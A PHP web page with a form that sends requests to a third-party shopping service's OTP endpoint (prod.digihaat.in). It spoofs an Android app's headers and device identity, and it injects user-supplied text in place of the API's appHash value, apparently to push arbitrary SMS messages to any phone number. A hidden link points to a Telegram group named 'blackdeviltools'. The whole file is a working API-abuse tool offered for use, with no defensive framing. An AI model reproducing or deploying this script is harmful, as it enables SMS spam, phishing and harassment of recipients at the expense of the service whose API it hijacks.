<?php
$response = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mobile = isset($_POST['mobile']) ? trim($_POST['mobile']) : '';
    $custom_sms = isset($_POST['custom_sms']) ? trim($_POST['custom_sms']) : 'WEB_APP_HASH'; // Default to original if empty

    if (!empty($mobile)) {
        $payload = json_encode([
            'mobile' => $mobile,
            'appHash' => $custom_sms // Using 'appHash' field as per API, but value from custom SMS input
        ]);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://prod.digihaat.in/clientApis/v2/auth/sendOTP');
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Host: prod.digihaat.in',
            'devicename: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.102 Mobile Safari/537.36',
            'deviceidentity: 62c0c1ad-385c-4311-a33d-4d10d429e5f2',
            'sec-ch-ua-platform: "Android"',
            'devicemodel: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.102 Mobile Safari/537.36',
            'osversion: Linux aarch64',
            'sec-ch-ua: "Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
            'targetlanguage: en',
            'sec-ch-ua-mobile: ?1',
            'appversion: 1.1.56',
            'user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.102 Mobile Safari/537.36',
            'accept: application/json, text/plain, */*',
            'content-type: application/json',
            'web: true',
            'devicemanufacturer: Unknown',
            'origin: https://digihaat.in',
            'x-requested-with: mark.via.gp',
            'sec-fetch-site: same-site',
            'sec-fetch-mode: cors',
            'sec-fetch-dest: empty',
            'referer: https://digihaat.in/',
            'accept-encoding: gzip, deflate, br, zstd',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
            'priority: u=1, i'
        ]);

        $response = curl_exec($ch);
        if (curl_error($ch)) {
            $response = 'cURL Error: ' . curl_error($ch);
        }
        curl_close($ch);
    } else {
        $response = 'Mobile number is required.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Custom Sender</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; }
        input[type="text"] { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
        input[type="submit"] { background: #007cba; color: white; padding: 10px 20px; border: none; cursor: pointer; width: 100%; }
        pre { background: #f4f4f4; padding: 10px; border: 1px solid #ddd; white-space: pre-wrap; }
    </style>
</head>
<body>
    <h2>Send Custom SMS via custom API</h2>
    <form method="POST">
        <label for="mobile">Mobile Number:</label>
        <input type="text" id="mobile" name="mobile" value="<?= htmlspecialchars($_POST['mobile'] ?? '') ?>" required placeholder="e.g., 9876543210">
        
        <label for="custom_sms">Custom SMS (replaces appHash):</label>
        <input type="text" id="custom_sms" name="custom_sms" value="<?= htmlspecialchars($_POST['custom_sms'] ?? '') ?>" placeholder="Enter custom SMS value">
        
        <input type="submit" value="Submit">
    </form>
    
    <?php if ($response): ?>
        <h3>API Response:</h3>
        <pre><?= htmlspecialchars($response) ?></pre>
    <?php endif; ?>
    
    <!-- Hidden Telegram Link -->
    <div style="display: none;">
        <a href="https://t.me/blackdeviltools">Telegram Group</a>
    </div>
</body>
</html>
